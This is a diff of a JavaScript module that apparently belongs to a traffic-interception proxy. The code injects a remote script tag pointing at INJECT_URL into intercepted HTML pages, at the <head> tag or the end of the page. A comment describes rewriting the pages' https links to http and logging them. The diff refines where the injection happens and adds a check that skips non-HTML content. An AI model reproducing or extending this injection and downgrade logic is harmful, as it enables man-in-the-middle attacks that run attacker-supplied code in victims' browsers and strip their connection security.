@@ -73,11 +73,9 @@ function parseList() {
 
 
 
-
 exports.init = function() {
 	parseList();
-};
-
+}
 
 //
 // 返回给用户的常用脚本库内容。
@@ -112,14 +110,20 @@ exports.injectJs = function(url) {
 var injectCode =
 	'<script src="http://' + INJECT_URL + '"></script>';
 
-exports.injectHtml = function(html, charset) {
+exports.injectHtml = function(data, charset) {
 	//
 	// 优先使用<meta>标签里的charset标记：
 	//   <meta charset="utf-8" />
 	//   <META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=GBK">
 	//
-	var str = html.toString();
-	var val = str.match(/<meta[^>]+charset=['"]?([\w\-]*)/i);
+	var str = data.toString();
+
+	// 不是html文件
+	if (! /<html|<body|<script|<img/i.test(str)) {
+		return data;
+	}
+
+	var val = str.match(/<meta\s+[^>]*charset=['"]?([\w\-]*)/i);
 
 	if (val && val[1]) {
 		charset = val[1];
@@ -130,15 +134,14 @@ exports.injectHtml = function(html, charset) {
 	//
 	charset = charset ? charset.toLowerCase() : 'utf-8';
 
-	html = (charset == 'utf-8')
-			? str
-			: iconv.decode(html, charset);
+	var html = (charset == 'utf-8')
+				? str
+				: iconv.decode(data, charset);
 
 	//
-	// 尝试在 </title>, <head>, <body>, </html> 标签后注入
+	// 在<head>标签或结尾注入
 	//
-	html = html.replace(/<\/title>|<head>|<body>|<body\s+[^>]*>|.$/i,
-		'$&' + injectCode);
+	html = html.replace(/<head>|$/i, '$&' + injectCode);
 
 	//
 	// 替换页面中的https链接为http，并做记录
